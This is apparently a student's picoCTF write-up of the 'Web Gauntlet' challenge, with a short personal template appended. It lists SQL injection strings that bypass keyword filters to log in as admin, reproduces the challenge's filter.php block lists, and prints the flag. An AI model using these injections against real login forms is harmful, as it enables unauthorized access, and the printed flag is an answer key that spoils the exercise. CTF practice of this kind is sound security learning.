# 1. Web Gauntlet
>Can you beat the filters? Log in as admin:
>http://shape-facility.picoctf.net:64326/
>http://shape-facility.picoctf.net:64326/filter.php
>Hints:
>  - You are not allowed to login with valid credentials.
>  - Write down the injections you use in case you lose your progress.
>  - For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
>  - sqlite
>  - If your cookie keeps getting reset, try using a private browser window

## Solution:
- i just use some of the popular sql injections
- for the 1st one i just had to comment out whatever was after admin
- same for the second one but i couldnt use -- so i just used ;
- ; also works for the 3rd one
- we need to concatenate for the 4th one so i used ||
- same || also works for the 5th one as i used || instead of union for the last one

```
SELECT * FROM users WHERE username='admin'--' AND password='sfg'
SELECT * FROM users WHERE username='admin';' AND password='sff'
SELECT * FROM users WHERE username='admin';' AND password='sff'
SELECT * FROM users WHERE username='ad'||'min'/*' AND password='sda'
SELECT * FROM users WHERE username='ad'||'min'/*' AND password='adf'
```
```
<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_79a0ddc6}
?>
```

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:
- sql injection

## Notes:
- note to self: memorise the cheatsheet from the next time

## Resources:
- https://portswigger.net/web-security/sql-injection/cheat-sheet

***

# 2. 
> Put in the challenge's description here

## Solution:
- 

```

```

## Flag:

```
picoCTF{}
```

## Concepts learnt:
-

## Notes:
-

## Resources:
-

***

# 3. 
> 

## Solution:
- 

```

```

## Flag:

```
picoCTF{}
```

## Concepts learnt:
-

## Notes:
-

## Resources:
-

***
